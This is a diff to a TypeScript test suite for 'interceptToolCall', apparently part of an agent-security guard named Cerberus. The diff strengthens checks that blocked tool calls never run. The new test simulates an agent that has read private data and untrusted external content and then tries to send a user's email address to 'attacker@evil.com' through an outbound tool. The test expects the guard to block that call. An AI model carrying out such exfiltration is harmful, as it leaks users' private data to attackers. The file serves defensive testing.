@@ -177,6 +177,7 @@ describe('interceptToolCall', () => {
 
     expect(result).toContain('[Cerberus]');
     expect(result).toContain('blocked');
+    expect(executor).not.toHaveBeenCalled();
   });
 
   it('should return real result when action is not interrupt', async () => {
@@ -192,6 +193,34 @@ describe('interceptToolCall', () => {
 
     const result = await wrapped({});
     expect(result).toBe('tool output');
+  });
+
+  it('should block outbound tools before execution when risk threshold is met', async () => {
+    const session = createSession();
+    session.privilegedValues.add('alice@example.com');
+    session.trustedSourcesAccessed.add('readPrivateData');
+    session.untrustedSources.add('fetchExternalContent');
+
+    const executor = vi.fn().mockResolvedValue('sent');
+    const assessments: RiskAssessment[] = [];
+    const wrapped = interceptToolCall(
+      'sendOutboundReport',
+      executor,
+      session,
+      { alertMode: 'interrupt', threshold: 1 },
+      OUTBOUND_TOOLS,
+      (assessment) => assessments.push(assessment),
+    );
+
+    const result = await wrapped({
+      recipient: 'attacker@evil.com',
+      body: 'alice@example.com',
+    });
+
+    expect(result).toContain('before execution');
+    expect(executor).not.toHaveBeenCalled();
+    expect(assessments).toHaveLength(1);
+    expect(assessments[0].action).toBe('interrupt');
   });
 
   it('should record signals in session', async () => {
@@ -375,6 +404,7 @@ describe('interceptToolCall — L4 integration', () => {
       BASE_CONFIG,
       OUTBOUND_TOOLS,
       (a) => assessments.push(a),
+      undefined,
       MEMORY_TOOLS,
       graph,
       ledger,
@@ -407,6 +437,7 @@ describe('interceptToolCall — L4 integration', () => {
       config,
       OUTBOUND_TOOLS,
       (a) => assessments.push(a),
+      undefined,
       MEMORY_TOOLS,
       graph,
       ledger,
@@ -462,6 +493,7 @@ describe('interceptToolCall — L4 integration', () => {
       config,
       OUTBOUND_TOOLS,
       onFull,
+      undefined,
       MEMORY_TOOLS,
       graph,
       ledger,
@@ -478,6 +510,7 @@ describe('interceptToolCall — L4 integration', () => {
       config,
       OUTBOUND_TOOLS,
       onFull,
+      undefined,
       MEMORY_TOOLS,
       graph,
       ledger,
@@ -494,6 +527,7 @@ describe('interceptToolCall — L4 integration', () => {
       config,
       OUTBOUND_TOOLS,
       onFull,
+      undefined,
       MEMORY_TOOLS,
       graph,
       ledger,
@@ -510,6 +544,7 @@ describe('interceptToolCall — L4 integration', () => {
       config,
       OUTBOUND_TOOLS,
       onFull,
+      undefined,
       MEMORY_TOOLS,
       graph,
       ledger,
